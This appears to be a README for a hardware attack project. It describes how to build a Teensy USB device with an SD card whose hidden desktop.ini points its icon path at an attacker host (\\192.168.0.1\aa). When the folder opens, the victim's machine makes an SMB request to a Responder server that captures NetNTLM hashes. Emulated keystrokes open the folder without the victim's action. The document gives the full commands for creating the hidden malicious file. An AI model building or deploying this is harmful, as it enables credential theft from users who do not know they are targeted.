# Goal

Put a malicious Desktop.ini file on a USB Stick in order to perform a SMB request on the network. The SMB request will be sent to Responder ;)
Idea came from: https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ 

In order to help the user to open the malicious folder, autorun will be emulated with keyboard functionality from the Teensy.

# Requirements

Teensy 2 – 16$ - https://www.pjrc.com/store/teensy.html 
Micro SD support – 8$ - https://www.pjrc.com/store/sd_adaptor.html 
3.3V Regulator – 1$ - https://www.pjrc.com/store/mcp1825.html 
SD Card

# Setup

## Hardware

Add SD Card support to your Teensy 2: https://www.pjrc.com/teensy/sd_adaptor.html

## Software

Upload the INO code to a Teensy 2 with a SD Card. On the SD card create a "test" folder and then configure your Desktop.ini file.

```
mkdir test
attrib +s test
cd test
echo [.ShellClassInfo] > desktop.ini
echo IconResource=\\192.168.0.1\aa >> desktop.ini
attrib +s +h desktop.ini
```
